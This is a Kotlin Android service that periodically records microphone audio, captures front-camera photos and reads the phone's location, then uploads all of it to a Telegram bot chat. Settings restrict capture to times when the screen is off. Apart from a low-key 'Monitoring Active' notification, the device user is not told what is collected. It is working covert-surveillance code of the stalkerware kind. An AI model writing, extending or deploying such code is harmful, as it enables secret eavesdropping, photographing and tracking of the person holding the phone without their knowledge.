package com.example.telegramsender

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build
import android.os.IBinder
import android.util.Log
import android.content.pm.ServiceInfo
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.core.ImageProxy
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.io.IOException

class MonitorService : Service(), LifecycleOwner {

    private val client = OkHttpClient.Builder()
        .connectTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
        .writeTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
        .readTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
        .build()
        
    private val lifecycleRegistry = LifecycleRegistry(this)
    private var job: Job? = null
    
    // Credentials & Config
    private var botToken: String = ""
    private var targetChatId: String = ""
    private var sendAudio: Boolean = false
    private var audioDuration: Long = 60000L
    private var audioScreenOff: Boolean = false
    private var sendCamera: Boolean = false
    private var cameraScreenOff: Boolean = false
    private var captureInterval: Long = 10000L 
    private var sendLocation: Boolean = false
    private var locationInterval: Long = 600000L // 10 mins

    private var mediaRecorder: android.media.MediaRecorder? = null
    private val prefsListener = android.content.SharedPreferences.OnSharedPreferenceChangeListener { sharedPreferences, key ->
        updateConfigFromPrefs(sharedPreferences)
    }

    override fun onCreate() {
        super.onCreate()
        lifecycleRegistry.currentState = Lifecycle.State.CREATED
        
        val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
        pref.registerOnSharedPreferenceChangeListener(prefsListener)
        updateConfigFromPrefs(pref)
        
        startForegroundServiceNotification()
        
        startLoops()
    }
    
    private fun updateConfigFromPrefs(pref: android.content.SharedPreferences) {
        botToken = pref.getString("token", "") ?: ""
        targetChatId = pref.getString("chatId", "") ?: ""
        sendCamera = pref.getBoolean("sendCamera", false)
        sendAudio = pref.getBoolean("sendAudio", false)
        sendLocation = pref.getBoolean("sendLocation", false)
        
        val camSec = pref.getLong("cameraInterval", 10L) 
        captureInterval = camSec * 1000L
        if (captureInterval < 5000L) captureInterval = 5000L
        
        audioDuration = pref.getLong("audioDuration", 60L) * 1000L
        if (audioDuration < 5000L) audioDuration = 5000L
        audioScreenOff = pref.getBoolean("audioScreenOff", false)
        cameraScreenOff = pref.getBoolean("cameraScreenOff", false)

        val locMin = pref.getLong("locationInterval", 10L)
        locationInterval = locMin * 60 * 1000L
        if (locationInterval < 60000L) locationInterval = 60000L
    }
    
    // Cleanup
    override fun onDestroy() {
        super.onDestroy()
        job?.cancel()
        mediaRecorder?.release()
        lifecycleRegistry.currentState = Lifecycle.State.DESTROYED
        getSharedPreferences("tg_pref", MODE_PRIVATE).unregisterOnSharedPreferenceChangeListener(prefsListener)
    }

    // ... (rest of onStartCommand) ...
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        lifecycleRegistry.currentState = Lifecycle.State.STARTED
        startForegroundServiceNotification()
        // No loadCredentials here, handled by onCreate and listener
        if (job == null || job?.isActive == false) startLoops()
        return START_STICKY
    }
    
    // Remove loadCredentials method entirely or alias it
    
    private fun startLoops() {
        job?.cancel()
        job = CoroutineScope(Dispatchers.IO).launch {
            // Heartbeat
            launch {
                while (isActive) {
                    startForegroundServiceNotification()
                    delay(60000)
                }
            }

            // Audio Loop
            launch {
                while (isActive) {
                    val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
                    if (!pref.getBoolean("is_monitoring_active", false)) {
                        delay(5000)
                        continue
                    }
                    if (!com.example.telegramsender.data.DevicePreferences.isRegistered(this@MonitorService)) {
                        delay(60000) // Check again in 1 min
                        continue
                    }
                    // loadCredentials() REMOVED
                    if (botToken.isNotEmpty() && targetChatId.isNotEmpty() && sendAudio) {
                         val shouldRecord = if (audioScreenOff) !isScreenOn() else true
                         if (shouldRecord) {
                             recordAndSendAudio()
                         } else {
                             delay(5000)
                         }
                    } else {
                        delay(10000) // Longer idle wait
                    }
                }
            }
            
            // Camera Loop
            launch {
                 while (isActive) {
                     val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
                     if (!pref.getBoolean("is_monitoring_active", false)) {
                         delay(5000)
                         continue
                     }
                     if (!com.example.telegramsender.data.DevicePreferences.isRegistered(this@MonitorService)) {
                        delay(60000) // Check again in 1 min
                        continue
                     }
                     // loadCredentials() REMOVED
                     if (botToken.isNotEmpty() && targetChatId.isNotEmpty() && sendCamera) {
                         val shouldCapture = if (cameraScreenOff) !isScreenOn() else true
                         if (shouldCapture) {
                             captureCameraAndSend()
                         }
                     }
                     
                     // Adaptive delay: if not configured, wait longer
                     val waitTime = if (sendCamera) captureInterval else 10000L
                     delay(waitTime)
                 }
            }

            // Location Loop
            launch {
                while (isActive) {
                    val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
                    if (!pref.getBoolean("is_monitoring_active", false)) {
                        delay(5000)
                        continue
                    }
                    if (!com.example.telegramsender.data.DevicePreferences.isRegistered(this@MonitorService)) {
                        delay(60000)
                        continue
                    }
                    if (botToken.isNotEmpty() && targetChatId.isNotEmpty() && sendLocation) {
                        fetchAndSendLocation()
                    }
                    delay(locationInterval)
                }
            }
        }
    }

    private fun fetchAndSendLocation() {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            return
        }
        val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
        try {
            val providers = lm.getProviders(true)
            var bestLoc: android.location.Location? = null
            for (p in providers) {
                val l = lm.getLastKnownLocation(p) ?: continue
                if (bestLoc == null || l.accuracy < bestLoc.accuracy) {
                    bestLoc = l
                }
            }
            if (bestLoc != null) {
                sendTelegramLocation(botToken, targetChatId, bestLoc.latitude, bestLoc.longitude)
            }
        } catch (e: Exception) {
            Log.e("MonitorService", "Location error", e)
        }
    }

    private fun sendTelegramLocation(token: String, chatId: String, lat: Double, lon: Double) {
        val url = "https://api.telegram.org/bot$token/sendLocation"
        val body = okhttp3.FormBody.Builder()
            .add("chat_id", chatId)
            .add("latitude", lat.toString())
            .add("longitude", lon.toString())
            .build()
        val request = Request.Builder().url(url).post(body).build()
        try { client.newCall(request).execute().use {
             if (it.isSuccessful) {
                 val key = if (url.contains("sendLocation")) "last_location_sent" else "last_photo_sent"
                 getSharedPreferences("tg_pref", MODE_PRIVATE).edit().putLong(key, System.currentTimeMillis()).apply()
             }
        } } catch (e: Exception) {}
    }

    private fun sendTelegramMessage(token: String, chatId: String, text: String) {
        val url = "https://api.telegram.org/bot$token/sendMessage"
        val body = okhttp3.FormBody.Builder()
            .add("chat_id", chatId)
            .add("text", text)
            .build()
        val request = Request.Builder().url(url).post(body).build()
        try { client.newCall(request).execute().use {
             if (it.isSuccessful) {
                 val key = if (url.contains("sendLocation")) "last_location_sent" else "last_photo_sent"
                 getSharedPreferences("tg_pref", MODE_PRIVATE).edit().putLong(key, System.currentTimeMillis()).apply()
             }
        } } catch (e: Exception) {}
    }

    private fun isScreenOn(): Boolean {
        val powerManager = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        return powerManager.isInteractive
    }
    
    private suspend fun recordAndSendAudio() {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
             Log.e("MonitorService", "Permission RECORD_AUDIO denied")
             return
        }

        // Check for active call
        val audioManager = getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
        if (audioManager.mode == android.media.AudioManager.MODE_IN_CALL || 
            audioManager.mode == android.media.AudioManager.MODE_IN_COMMUNICATION) {
            Log.w("MonitorService", "Microphone busy (Call/Comm). Skipping.")
            delay(30000) // Wait 30s before retry
            return
        }
        
        // Ensure Mic is free
        delay(2000)

        // Use .m4a for high quality AAC
        val dateFormat = java.text.SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", java.util.Locale.getDefault())
        val timestamp = dateFormat.format(java.util.Date())
        val audioFile = java.io.File(cacheDir, "audio_$timestamp.m4a")
        
        // Local variable for thread safety within this suspension
        var mr: android.media.MediaRecorder? = null
        
        try {
            mr = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                android.media.MediaRecorder(this)
            } else {
                android.media.MediaRecorder()
            }
            
            mr.apply {
                setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                setAudioEncodingBitRate(128000) // 128 kbps
                setAudioSamplingRate(44100)     // 44.1 kHz
                setOutputFile(audioFile.absolutePath)
                prepare()
                delay(100) // Give hardware a moment
                try {
                     start()
                } catch(e: Exception) {
                     Log.e("MonitorService", "Initial start failed ($e). Retrying...", e)
                     reset()
                     setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                     setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                     setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                     setAudioEncodingBitRate(128000)
                     setAudioSamplingRate(44100)
                     setOutputFile(audioFile.absolutePath)
                     prepare()
                     start() // Try once more, catch in outer block
                }
            }
            
            Log.d("MonitorService", "Recording Audio for $audioDuration ms")
            
            // Record
            delay(audioDuration)
            
            try { 
                mr.stop() 
            } catch(e: RuntimeException) {
                Log.w("MonitorService", "Recorder stop failed", e)
            }
            
            // Critical release before network
            mr.release()
            mr = null
            
            // Send
            if (audioFile.exists() && audioFile.length() > 0) {
                 sendTelegramAudio(botToken, targetChatId, audioFile)
                 audioFile.delete()
            }
            
        } catch (e: Exception) {
            Log.e("MonitorService", "Audio Record Fatal Error", e)
            if (audioFile.exists()) audioFile.delete()
            
            // Try to reset to clear state
            try { mr?.reset() } catch(e:Exception){}
            
            delay(30000) // Cool down on error
        } finally {
            try { mr?.release() } catch (e: Exception) {}
        }
    }
    
    private suspend fun captureCameraAndSend() {
        withContext(Dispatchers.Main) {
            try {
                // ... CameraX Logic ...
                 val cameraProviderFuture = ProcessCameraProvider.getInstance(this@MonitorService)
                 cameraProviderFuture.addListener({
                    val cameraProvider = cameraProviderFuture.get()
                    val imageCapture = ImageCapture.Builder().setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY).build()
                    val cameraSelector = CameraSelector.DEFAULT_FRONT_CAMERA
                    
                    try {
                        cameraProvider.unbindAll()
                        cameraProvider.bindToLifecycle(this@MonitorService, cameraSelector, imageCapture)
                        
                        imageCapture.takePicture(ContextCompat.getMainExecutor(this@MonitorService), object : ImageCapture.OnImageCapturedCallback() {
                            override fun onCaptureSuccess(image: ImageProxy) {
                                val bitmap = imageProxyToBitmap(image)
                                image.close()
                                if (bitmap != null) {
                                    CoroutineScope(Dispatchers.IO).launch {
                                         sendTelegramPhoto(botToken, targetChatId, bitmap, "camera.jpg")
                                    }
                                }
                                cameraProvider.unbindAll() // Release immediately
                            }
                            override fun onError(exception: ImageCaptureException) {
                                cameraProvider.unbindAll()
                            }
                        })
                    } catch(e:Exception) {}
                 }, ContextCompat.getMainExecutor(this@MonitorService))
            } catch (e: Exception) {}
        }
    }
    
    private fun imageProxyToBitmap(image: ImageProxy): Bitmap? {
        val buffer = image.planes[0].buffer
        val bytes = ByteArray(buffer.remaining())
        buffer.get(bytes)
        return BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
    }

    private fun sendTelegramAudio(token: String, chatId: String, file: java.io.File) {
        val url = "https://api.telegram.org/bot$token/sendAudio"
        try {
             val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("audio", file.name,
                    file.readBytes().toRequestBody("audio/m4a".toMediaTypeOrNull(), 0, file.length().toInt()))
                .build()
            val request = Request.Builder().url(url).post(requestBody).build()
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    Log.e("MonitorService", "Failed to send audio: ${response.code} ${response.message}")
                } else {
                    Log.d("MonitorService", "Audio sent successfully")
                    getSharedPreferences("tg_pref", MODE_PRIVATE).edit().putLong("last_audio_sent", System.currentTimeMillis()).apply()
                }
            }
        } catch (e: Exception) { Log.e("MonitorService", "Send Audio Failed", e) }
    }
    
    private fun sendTelegramPhoto(token: String, chatId: String, originalBitmap: Bitmap, filename: String) {
         // ... Reusing logic from TelegramService, simplified ...
         // (Ideally should be in a Shared Helper, but duplicating for safety now to avoid extensive refactor)
        val url = "https://api.telegram.org/bot$token/sendPhoto"
        val stream = ByteArrayOutputStream()
        originalBitmap.compress(Bitmap.CompressFormat.JPEG, 60, stream)
        val byteArray = stream.toByteArray()
        originalBitmap.recycle() // Important!
        
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("photo", filename,
                byteArray.toRequestBody("image/jpeg".toMediaTypeOrNull(), 0, byteArray.size))
            .build()
        val request = Request.Builder().url(url).post(requestBody).build()
        try { client.newCall(request).execute().use { } } catch(e: Exception) {}
    }

    private fun startForegroundServiceNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("MonitorServiceChannel", "Monitor Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        val notification = NotificationCompat.Builder(this, "MonitorServiceChannel")
            .setContentTitle("Monitor Service")
            .setContentText("Monitoring Active")
            .setSmallIcon(R.mipmap.ic_launcher)
            .build()
            
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                var type = 0
                if (sendAudio && ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                }
                if (sendCamera && ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                }
                if (sendLocation && ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                }
                if (type == 0 && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                     type = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                }
                
                if (type != 0) {
                    try {
                        startForeground(2, notification, type)
                    } catch (se: SecurityException) {
                        Log.e("MonitorService", "SecurityException starting FGS with sensitive types. Retrying with DATA_SYNC.", se)
                        startForeground(2, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                    }
                } else {
                    startForeground(2, notification)
                }
            } else {
                startForeground(2, notification)
            }
        } catch (e: Exception) {
            Log.e("MonitorService", "Failed to start FGS", e)
        }
    }



    override fun onBind(intent: Intent?): IBinder? = null
    
    override val lifecycle: Lifecycle
        get() = lifecycleRegistry
}
